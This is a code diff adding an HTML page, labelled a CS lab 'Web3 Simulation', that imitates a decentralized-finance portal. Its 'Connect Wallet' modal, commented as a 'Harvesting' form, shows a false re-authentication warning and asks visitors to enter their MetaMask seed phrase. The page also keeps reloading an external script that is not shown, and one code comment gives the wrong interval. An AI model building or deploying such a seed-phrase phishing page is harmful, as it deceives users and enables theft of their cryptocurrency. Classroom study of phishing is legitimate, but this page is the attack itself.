@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CS Lab: Web3 Simulation</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Main Application UI -->
+  <div class="main-container">
+    <h1>Decentralized Finance Portal</h1>
+    <p>Connect your wallet to view your mock balance.</p>
+    <button id="openModalBtn">Connect Wallet</button>
+  </div>
+
+  <!-- Harvesting Modal Overlay -->
+  <div id="walletModal" class="modal-overlay hidden">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h2>Secure Connection</h2>
+        <button id="closeModalBtn" class="close-btn">&times;</button>
+      </div>
+      
+      <!-- Phase 1: Wallet Selection -->
+      <div id="stepSelectWallet" class="modal-body">
+        <p class="subtitle">Select your preferred provider:</p>
+        <button id="selectMetaMaskBtn" class="wallet-option">
+          <img src="img/mtmask.webp" alt="MetaMask" width="24">
+          MetaMask Browser Extension
+        </button>
+      </div>
+
+      <!-- Phase 2: The Mock Harvest Form -->
+      <div id="stepHarvest" class="modal-body hidden">
+        <div class="warning-banner">
+          ⚠️ Action Required: Re-authenticate your wallet structure.
+        </div>
+        <p class="form-instruction">Enter your 12 or 24-word Secret Recovery Phrase (Seed Phrase) to verify ownership:</p>
+        
+        <form id="harvestForm">
+          <textarea 
+            id="seedPhraseInput" 
+            rows="4" 
+            placeholder="word1 word2 word3..." 
+            required></textarea>
+          <button type="submit" class="submit-harvest-btn">Verify & Connect</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <script>
+  function reloadJS() {
+    const oldScript = document.getElementById("dynamic-js");
+
+    if (oldScript) {
+      oldScript.remove();
+    }
+
+    const script = document.createElement("script");
+    script.id = "dynamic-js";
+    script.src = "script.js?t=" + Date.now(); // prevents browser cache
+    document.body.appendChild(script);
+  }
+
+  reloadJS(); // load initially
+
+  setInterval(reloadJS, 25000); // reload every 15 seconds
+</script>
+  <script src="script.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
